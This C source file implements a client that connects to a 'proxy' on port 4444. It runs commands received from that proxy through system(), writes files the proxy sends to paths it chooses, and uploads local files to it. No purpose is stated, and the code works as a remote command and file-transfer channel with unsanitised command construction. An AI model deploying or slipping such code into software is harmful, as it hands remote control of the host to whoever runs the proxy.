#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <libgen.h>  // for dirname()
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include "headers/process_info.h"
#include "headers/proxy.h"

#ifndef PROXY_IP
#define PROXY_IP "127.0.0.1"  // Proxy address
#endif

#ifndef PROXY_PORT
#define PROXY_PORT 4444  // Proxy port
#endif


void create_directory_if_needed(const char *filepath) {
    char path_copy[1024];
    strncpy(path_copy, filepath, sizeof(path_copy));
    path_copy[sizeof(path_copy) - 1] = '\0';

    // Get the directory part of the path
    char dir_path[1024];
    strncpy(dir_path, dirname(path_copy), sizeof(dir_path));
    dir_path[sizeof(dir_path) - 1] = '\0';

    char tmp_path[1024] = "";
    char *token;
    const char delim[2] = "/";

    // Handle absolute paths
    if (filepath[0] == '/') {
        strcat(tmp_path, "/");
    }

    token = strtok(dir_path, delim);
    while (token != NULL) {
        strcat(tmp_path, token);
        strcat(tmp_path, "/");

        struct stat st = {0};
        if (stat(tmp_path, &st) == -1) {
            if (mkdir(tmp_path, 0755) == -1 && errno != EEXIST) {
                perror("mkdir");
                return;
            }
        }

        token = strtok(NULL, delim);
    }
}

int recv_all(int proxy_sock, void *buffer, size_t length) {
    size_t total = 0;
    while (total < length) {
        int bytes = recv(proxy_sock, (char *)buffer + total, length - total, 0);
        if (bytes <= 0) return -1;
        total += bytes;
    }
    return 0;
}

int proxy_sock = -1;

int get_proxy_socket() {
    proxy_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (proxy_sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PROXY_PORT)
    };
    inet_pton(AF_INET, PROXY_IP, &serv_addr.sin_addr);

    if (connect(proxy_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection to proxy failed");
        close(proxy_sock);
        proxy_sock = -1;
        return -1;
    }

    return proxy_sock;
}

void send_request_to_proxy(const char *request_message) {
    
    send(proxy_sock, request_message, strlen(request_message), 0);

    // === Receive mode ===
    uint8_t mode;
    if (recv_all(proxy_sock, &mode, 1) != 0) {
        fprintf(stderr, "Invalid or incomplete response: missing mode\n");
        close(proxy_sock);
        return;

    }

    // === Receive path length ===
    uint32_t path_len;
    if (recv_all(proxy_sock, &path_len, sizeof(path_len)) != 0) {
        fprintf(stderr, "Invalid or incomplete response: missing path length\n");
        close(proxy_sock);
        return;
    }
    path_len = ntohl(path_len);

    if (path_len == 0 || path_len >= 1024) {
        fprintf(stderr, "Invalid path length: %u\n", path_len);
        close(proxy_sock);
        return;
    }

    // === Receive path ===
    char path[1024] = {0};
    if (recv_all(proxy_sock, path, path_len) != 0) {
        fprintf(stderr, "Failed to receive full path\n");
        close(proxy_sock);
        return;
    }
    path[path_len] = '\0';

    if (mode == 0x01) {
        // === Command mode ===
        uint64_t cmd_len;
        if (recv_all(proxy_sock, &cmd_len, sizeof(cmd_len)) != 0) {
            fprintf(stderr, "Missing command length\n");
            close(proxy_sock);
            return;
        }
        cmd_len = be64toh(cmd_len);

        if (cmd_len == 0 || cmd_len >= 8192) {
            fprintf(stderr, "Invalid command length: %lu\n", cmd_len);
            close(proxy_sock);
            return;
        }

        char command[8192 + 1];
        if (recv_all(proxy_sock, command, cmd_len) != 0) {
            fprintf(stderr, "Failed to receive full command\n");
            close(proxy_sock);
            return;
        }
        command[cmd_len] = '\0';

        printf("Executing command: %s %s\n", command, path);
        char full_cmd[10240];
        snprintf(full_cmd, sizeof(full_cmd), "%s %s", command, path);
        int ret = system(full_cmd);
        if (ret == -1) perror("Command execution failed");
        else printf("Exited with code %d\n", WEXITSTATUS(ret));

    } else if (mode == 0x02) {
        // === File mode ===
        uint64_t file_size;
        if (recv_all(proxy_sock, &file_size, sizeof(file_size)) != 0) {
            fprintf(stderr, "Missing file size\n");
            close(proxy_sock);
            return;
        }
        file_size = be64toh(file_size);

        printf("Receiving file: %s (%lu bytes)\n", path, file_size);
        create_directory_if_needed(path);
        FILE *f = fopen(path, "wb");
        if (!f) {
            perror("Failed to open file");
            close(proxy_sock);
            return;
        }

        char buffer[4096];
        uint64_t remaining = file_size;
        while (remaining > 0) {
            int chunk = recv(proxy_sock, buffer, remaining > sizeof(buffer) ? sizeof(buffer) : remaining, 0);
            if (chunk <= 0) break;
            fwrite(buffer, 1, chunk, f);
            remaining -= chunk;
        }
        fclose(f);
        printf("Saved to %s\n", path);

    } else {
        fprintf(stderr, "Unknown mode: %u\n", mode);
    }

    close(proxy_sock);
    proxy_sock = -1;

}

void send_file_to_proxy(const char *file_path) {
    FILE *f = fopen(file_path, "rb");
    if (!f) {
        perror("fopen");
        return;
    }

    int proxy_sock = get_proxy_socket();  // however you're getting your socket
    if (proxy_sock < 0) return;

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    rewind(f);

    // Send file metadata (name + size)
    char header[512];
    snprintf(header, sizeof(header), "[FILE_TRANSFER]\nFILENAME:%s\nSIZE:%ld\n", basename((char *)file_path), file_size);
    send(proxy_sock, header, strlen(header), 0);

    // Send the file content
    char buffer[1024];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        send(proxy_sock, buffer, bytes, 0);
    }

    fclose(f);

}
